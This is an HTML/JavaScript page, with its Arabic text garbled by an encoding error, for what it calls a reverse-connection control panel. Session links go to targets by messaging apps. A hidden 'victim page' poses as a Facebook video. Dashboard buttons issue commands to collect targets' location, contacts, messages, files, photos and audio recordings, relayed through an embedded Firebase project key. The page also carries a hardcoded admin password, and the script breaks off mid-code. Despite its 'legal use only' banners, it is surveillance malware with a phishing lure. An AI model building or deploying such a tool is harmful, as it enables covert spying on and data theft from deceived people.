<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„ - Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¹ÙƒØ³ÙŠ</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage-compat.js"></script>
    <style>
        :root {
            --primary: #3498db;
            --success: #27ae60;
            --danger: #e74c3c;
            --warning: #f39c12;
            --dark: #2c3e50;
            --light: #ecf0f1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡ Ø§Ù„Ø£Ù…Ù†ÙŠ */
        .security-alert {
            background: var(--warning);
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        
        /* Ø§Ù„Ù‡ÙŠØ¯Ø± */
        header {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        h1 {
            color: var(--dark);
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        
        .subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
        }
        
        /* Ù‚Ø³Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© */
        .auth-section {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .auth-section input {
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1em;
            margin: 10px;
            width: 250px;
        }
        
        /* Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 1100px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª */
        .card {
            background: rgba(255, 255, 255, 0.95);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }
        
        .card h3 {
            color: var(--dark);
            margin-bottom: 18px;
            border-bottom: 2px solid var(--primary);
            padding-bottom: 10px;
            font-size: 1.4em;
        }
        
        /* Ø´Ø¨ÙƒØ© Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--light);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border-left: 4px solid var(--primary);
        }
        
        .stat-number {
            font-size: 2.2em;
            font-weight: bold;
            color: var(--dark);
        }
        
        .stat-label {
            color: #7f8c8d;
            font-size: 0.9em;
        }
        
        /* Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© */
        .devices-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .device-card {
            background: var(--light);
            padding: 18px;
            margin: 12px 0;
            border-radius: 10px;
            border-right: 4px solid var(--success);
            transition: all 0.3s ease;
        }
        
        .device-card:hover {
            background: #e0e0e0;
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .device-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 8px;
        }
        
        .info-item {
            font-size: 0.9em;
        }
        
        .info-label {
            font-weight: bold;
            color: var(--dark);
        }
        
        .info-value {
            color: #7f8c8d;
        }
        
        .status-indicator {
            font-size: 0.8em;
            padding: 4px 10px;
            border-radius: 20px;
            background: var(--success);
            color: white;
        }
        
        /* Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 600;
            transition: all 0.3s ease;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            margin: 5px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #2980b9;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-success:hover {
            background: #219a52;
        }
        
        .btn-warning {
            background: var(--warning);
            color: white;
        }
        
        .btn-warning:hover {
            background: #d68910;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #c0392b;
        }
        
        .btn-small {
            padding: 8px 15px;
            font-size: 0.85em;
        }
        
        /* Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø¬Ù„Ø³Ø§Øª - ØªØµÙ…ÙŠÙ… Ù…Ø­Ø³Ù† */
        .session-link-container {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            color: white;
            padding: 15px;
            margin: 15px 0;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            border: 2px solid #fff;
        }
        
        .session-link-container h4 {
            margin-bottom: 10px;
            font-size: 1.1em;
        }
        
        .clickable-link {
            display: block;
            background: white;
            color: #27ae60;
            padding: 12px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            word-break: break-all;
            margin: 10px 0;
            border: 2px solid transparent;
            transition: all 0.3s ease;
        }
        
        .clickable-link:hover {
            background: #f8f9fa;
            border-color: #27ae60;
            transform: translateY(-2px);
        }
        
        .link-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        /* Ø¹Ù†Ø§ØµØ± Ø§Ù„ØªØ­ÙƒÙ… */
        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin-top: 15px;
        }
        
        /* Ø§Ù„Ø³Ø¬Ù„Ø§Øª */
        .logs-container {
            max-height: 300px;
            overflow-y: auto;
            background: var(--light);
            padding: 15px;
            border-radius: 8px;
        }
        
        .log-entry {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            font-size: 0.9em;
        }
        
        .timestamp {
            color: #7f8c8d;
            font-weight: bold;
        }
        
        /* Ø§Ù„ØªØ°ÙŠÙŠÙ„ */
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: white;
            opacity: 0.9;
        }
        
        /* ØµÙØ­Ø© Ø§Ù„Ø¶Ø­ÙŠØ© (Ù…Ø®ÙÙŠØ©) */
        .victim-page {
            display: none;
            background: #1877f2;
            color: white;
            min-height: 100vh;
            text-align: center;
            padding: 50px 20px;
        }
        
        .video-container {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 500px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        
        .video-placeholder {
            background: #000;
            height: 300px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        /* Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª */
        .tabs {
            display: flex;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            overflow: hidden;
        }
        
        .tab {
            padding: 15px 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            flex: 1;
        }
        
        .tab.active {
            background: var(--primary);
            color: white;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.3s ease;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        /* Ø§Ù„ØªÙƒÙŠÙ Ù…Ø¹ Ø§Ù„Ø´Ø§Ø´Ø§Øª Ø§Ù„ØµØºÙŠØ±Ø© */
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            h1 {
                font-size: 1.8em;
            }
            
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .device-info {
                grid-template-columns: 1fr;
            }
            
            .link-actions {
                flex-direction: column;
            }
            
            .tabs {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <!-- Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡ Ø§Ù„Ø£Ù…Ù†ÙŠ -->
    <div class="security-alert">
        âš ï¸ Ù†Ø¸Ø§Ù… Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù‚Ø§Ù†ÙˆÙ†ÙŠ ÙÙ‚Ø· - ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø§Øª Ø§Ù„Ù„Ø§Ø²Ù…Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…
    </div>

    <!-- Ø¥Ø´Ø¹Ø§Ø± Ø§Ù„Ù†Ø³Ø® -->
    <div id="copyNotification" class="notification">
        âœ… ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!
    </div>

    <div class="container">
        <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… (ØªØ¸Ù‡Ø± Ø¹Ù†Ø¯ Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ Ø¬Ù„Ø³Ø©) -->
        <div id="controlPanel">
            <header>
                <h1>ğŸ”„ Ù†Ø¸Ø§Ù… Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¹ÙƒØ³ÙŠ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„</h1>
                <p class="subtitle">Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª Ø¹Ù† Ø¨ÙØ¹Ø¯ - Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù…Ø­Ø³Ù†Ø©</p>
            </header>

            <!-- Ù‚Ø³Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© -->
            <div id="authSection" class="auth-section">
                <h3>ğŸ” Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„</h3>
                <input type="password" id="adminPassword" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¥Ø¯Ø§Ø±ÙŠØ©">
                <button class="btn btn-primary" onclick="authenticate()">Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…</button>
                <p style="margin-top: 10px; font-size: 0.9em; color: #7f8c8d;">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©: admin123</p>
            </div>

            <!-- Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… (ØªØ¸Ù‡Ø± Ø¨Ø¹Ø¯ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©) -->
            <div id="dashboard" class="dashboard" style="display: none;">
                <!-- Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª -->
                <div class="tabs">
                    <div class="tab active" onclick="switchTab('overview')">Ù†Ø¸Ø±Ø© Ø¹Ø§Ù…Ø©</div>
                    <div class="tab" onclick="switchTab('sessions')">Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¬Ù„Ø³Ø§Øª</div>
                    <div class="tab" onclick="switchTab('devices')">Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…ØªØµÙ„Ø©</div>
                    <div class="tab" onclick="switchTab('commands')">Ø§Ù„Ø£ÙˆØ§Ù…Ø±</div>
                    <div class="tab" onclick="switchTab('results')">Ø§Ù„Ù†ØªØ§Ø¦Ø¬</div>
                </div>

                <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨: Ù†Ø¸Ø±Ø© Ø¹Ø§Ù…Ø© -->
                <div id="overview" class="tab-content active">
                    <div class="main-grid">
                        <!-- Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª -->
                        <div class="card">
                            <h3>ğŸ“Š Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</h3>
                            <div class="stats-grid">
                                <div class="stat-card">
                                    <div class="stat-number" id="connectedCount">0</div>
                                    <div class="stat-label">Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…ØªØµÙ„Ø©</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="sessionsCount">0</div>
                                    <div class="stat-label">Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="commandsCount">0</div>
                                    <div class="stat-label">Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…Ø±Ø³Ù„Ø©</div>
                                </div>
                                <div class="stat-card">
                                    <div class="stat-number" id="resultsCount">0</div>
                                    <div class="stat-label">Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©</div>
                                </div>
                            </div>
                        </div>

                        <!-- Ø¨Ø·Ø§Ù‚Ø© Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¬Ù„Ø³Ø§Øª -->
                        <div class="card">
                            <h3>ğŸ¯ Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ù„Ø³Ø© Ø¹ÙƒØ³ÙŠØ©</h3>
                            <p>Ù‚Ù… Ø¨Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø¬Ù„Ø³Ø© Ø¹ÙƒØ³ÙŠØ© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡ Ù„Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù. ÙŠÙ…ÙƒÙ† Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆÙ…Ø´Ø§Ø±ÙƒØªÙ‡ Ù…Ø¨Ø§Ø´Ø±Ø© ÙÙŠ Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨ Ø£Ùˆ Ø£ÙŠ ØªØ·Ø¨ÙŠÙ‚ Ù…Ø±Ø§Ø³Ù„Ø©.</p>
                            <button class="btn btn-success" onclick="createReverseSession()">ğŸª Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ù„Ø³Ø© Ø¬Ø¯ÙŠØ¯Ø©</button>
                            <div id="sessionLinksContainer" style="margin-top: 20px;"></div>
                        </div>
                    </div>

                    <!-- Ø¨Ø·Ø§Ù‚Ø© Ø¢Ø®Ø± Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª -->
                    <div class="card">
                        <h3>ğŸ“ Ø¢Ø®Ø± Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª</h3>
                        <div id="recentActivity" class="logs-container">
                            <div class="log-entry">
                                <span class="timestamp">[Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...]</span>
                                <span class="message">ÙŠØªÙ… ØªØ­Ù…ÙŠÙ„ Ø³Ø¬Ù„ Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¬Ù„Ø³Ø§Øª -->
                <div id="sessions" class="tab-content">
                    <div class="card">
                        <h3>ğŸ”„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©</h3>
                        <div id="sessionsList">
                            <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©...</p>
                        </div>
                    </div>
                </div>

                <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨: Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…ØªØµÙ„Ø© -->
                <div id="devices" class="tab-content">
                    <div class="card">
                        <h3>ğŸ“± Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…ØªØµÙ„Ø©</h3>
                        <div id="devicesContainer" class="devices-list">
                            <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©...</p>
                        </div>
                    </div>
                </div>

                <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨: Ø§Ù„Ø£ÙˆØ§Ù…Ø± -->
                <div id="commands" class="tab-content">
                    <div class="main-grid">
                        <!-- Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø³Ø±ÙŠØ¹Ø© -->
                        <div class="card">
                            <h3>âš¡ Ø£ÙˆØ§Ù…Ø± Ø³Ø±ÙŠØ¹Ø©</h3>
                            <div class="controls-grid">
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_info')">ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_location')">ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_contacts')">ğŸ‘¥ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</button>
                                <button class="btn btn-primary" onclick="sendCommandToAll('get_messages')">ğŸ’¬ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('take_photo')">ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('record_audio')">ğŸ™ï¸ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª</button>
                                <button class="btn btn-warning" onclick="sendCommandToAll('get_files')">ğŸ“‚ Ø§Ù„Ù…Ù„ÙØ§Øª</button>
                                <button class="btn btn-danger" onclick="sendCommandToAll('vibrate')">ğŸ“³ Ø§Ù‡ØªØ²Ø§Ø²</button>
                            </div>
                        </div>

                        <!-- Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…Ø®ØµØµØ© -->
                        <div class="card">
                            <h3>ğŸ›ï¸ Ø£ÙˆØ§Ù…Ø± Ù…Ø®ØµØµØ©</h3>
                            <div style="margin-bottom: 15px;">
                                <label for="customCommand" style="display: block; margin-bottom: 8px; font-weight: bold;">Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ù…Ø®ØµØµ:</label>
                                <input type="text" id="customCommand" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ ØªÙ†ÙÙŠØ°Ù‡" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px;">
                            </div>
                            <button class="btn btn-primary" onclick="sendCustomCommand()">ğŸš€ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±</button>
                        </div>
                    </div>
                </div>

                <!-- Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨: Ø§Ù„Ù†ØªØ§Ø¦Ø¬ -->
                <div id="results" class="tab-content">
                    <div class="card">
                        <h3>ğŸ“„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©</h3>
                        <div id="resultsContainer" class="logs-container">
                            <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- ØµÙØ­Ø© Ø§Ù„Ø¶Ø­ÙŠØ© (ØªØ¸Ù‡Ø± Ø¹Ù†Ø¯ ÙØªØ­ Ø±Ø§Ø¨Ø· Ø§Ù„Ø¬Ù„Ø³Ø©) -->
        <div id="victimPage" class="victim-page">
            <div style="max-width: 600px; margin: 0 auto;">
                <h1 style="font-size: 2em; margin-bottom: 10px;">ğŸ¥ ÙÙŠØ¯ÙŠÙˆ ÙÙŠØ³Ø¨ÙˆÙƒ</h1>
                <p style="margin-bottom: 30px; opacity: 0.9;">ÙÙŠØ¯ÙŠÙˆ Ù…Ø«ÙŠØ± Ù„Ù„Ø§Ù‡ØªÙ…Ø§Ù… Ù…Ù† ØµØ¯ÙŠÙ‚Ùƒ</p>
                
                <div class="video-container">
                    <h3 style="color: #1877f2; margin-bottom: 15px;">ÙÙŠØ¯ÙŠÙˆ Ø­ØµØ±ÙŠ ğŸŒŸ</h3>
                    <div class="video-placeholder">
                        <div style="text-align: center;">
                            <div style="font-size: 3em; margin-bottom: 10px;">â–¶ï¸</div>
                            <p style="color: white; font-size: 1.2em;">Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...</p>
                            <p style="color: #ccc; font-size: 0.9em; margin-top: 10px;">Ø³ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØ´ØºÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹</p>
                        </div>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-top: 15px; color: #666; font-size: 0.9em;">
                        <span>ğŸ‘ï¸ 2.3K Ù…Ø´Ø§Ù‡Ø¯Ø©</span>
                        <span>â¤ï¸ 154 Ø¥Ø¹Ø¬Ø§Ø¨</span>
                        <span>ğŸ•’ 5:30 Ø¯Ù‚ÙŠÙ‚Ø©</span>
                    </div>
                </div>
                
                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; margin-top: 20px;">
                    <p style="margin-bottom: 10px;">ğŸ“± ØªÙ… ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¨Ù†Ø¬Ø§Ø­ Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø²Ùƒ</p>
                    <p style="font-size: 0.9em; opacity: 0.8;">Ø¬Ø§Ø±ÙŠ Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£Ù…Ø«Ù„...</p>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <p>Â© 2024 Ù†Ø¸Ø§Ù… Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„ - Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù‚Ø§Ù†ÙˆÙ†ÙŠ ÙˆØ§Ù„Ù…ØµØ±Ø­ Ø¨Ù‡ ÙÙ‚Ø·</p>
    </footer>

    <script>
        // ØªÙƒÙˆÙŠÙ† Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyD9aLabUWNfgjqoIuZSYNm1X8kAtM-Eac8",
            authDomain: "andex-html.firebaseapp.com",
            databaseURL: "https://andex-html-default-rtdb.firebaseio.com",
            projectId: "andex-html",
            storageBucket: "andex-html.firebasestorage.app",
            messagingSenderId: "94749059385",
            appId: "1:94749059385:web:a0b449d411a93cd75520e8",
            measurementId: "G-QH61RWKH8K"
        };
        
        // ØªÙ‡ÙŠØ¦Ø© Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();

        // ÙØ¦Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        class ReverseConnectionSystem {
            constructor() {
                this.isAuthenticated = false;
                this.sessions = {};
                this.connectedDevices = {};
                this.commands = {};
                this.results = {};
                this.activityLogs = [];
                this.init();
            }

            init() {
                this.checkPageMode();
                this.setupSecurityWarning();
            }

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù†Ù…Ø· Ø§Ù„ØµÙØ­Ø© (Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø£Ùˆ ØµÙØ­Ø© Ø¶Ø­ÙŠØ©)
            checkPageMode() {
                const urlParams = new URLSearchParams(window.location.search);
                const sessionId = urlParams.get('session');
                
                if (sessionId) {
                    // Ø¹Ø±Ø¶ ØµÙØ­Ø© Ø§Ù„Ø¶Ø­ÙŠØ©
                    document.getElementById('controlPanel').style.display = 'none';
                    document.getElementById('victimPage').style.display = 'block';
                    this.initVictimMode(sessionId);
                } else {
                    // Ø¹Ø±Ø¶ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
                    document.getElementById('controlPanel').style.display = 'block';
                    document.getElementById('victimPage').style.display = 'none';
                }
            }

            // ØªØ­Ø°ÙŠØ± Ø£Ù…Ù†ÙŠ
            setupSecurityWarning() {
                console.log(`
                âš ï¸  ØªØ­Ø°ÙŠØ± Ø£Ù…Ù†ÙŠ:
                - Ù‡Ø°Ø§ Ø§Ù„Ù†Ø¸Ø§Ù… Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù‚Ø§Ù†ÙˆÙ†ÙŠ ÙÙ‚Ø·
                - ÙŠØ¬Ø¨ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
                - Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù†Ø´Ø·Ø© Ù…Ø³Ø¬Ù„Ø© ÙˆÙ…Ø±Ø§Ù‚Ø¨Ø©
                `);
            }

            // Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„
            authenticate() {
                const password = document.getElementById('adminPassword').value;
                // ÙÙŠ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØŒ Ø§Ø³ØªØ®Ø¯Ù… Ù…ØµØ§Ø¯Ù‚Ø© Ø¢Ù…Ù†Ø©
                if (password === 'admin123') {
                    this.isAuthenticated = true;
                    document.getElementById('authSection').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    this.startMonitoring();
                    this.logActivity('ØªÙ…Øª Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­');
                } else {
                    alert('ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø© - Ø§Ø³ØªØ®Ø¯Ù…: admin123');
                }
            }

            // Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
            startMonitoring() {
                if (!this.isAuthenticated) return;

                // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø¬Ù„Ø³Ø§Øª
                database.ref('sessions').on('value', (snapshot) => {
                    this.sessions = snapshot.val() || {};
                    this.updateSessionsDisplay();
                    this.updateDashboard();
                });

                // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
                database.ref('devices').on('value', (snapshot) => {
                    this.connectedDevices = snapshot.val() || {};
                    this.updateDevicesDisplay();
                    this.updateDashboard();
                });

                // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø±
                database.ref('commands').on('value', (snapshot) => {
                    this.commands = snapshot.val() || {};
                    this.updateDashboard();
                });

                // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬
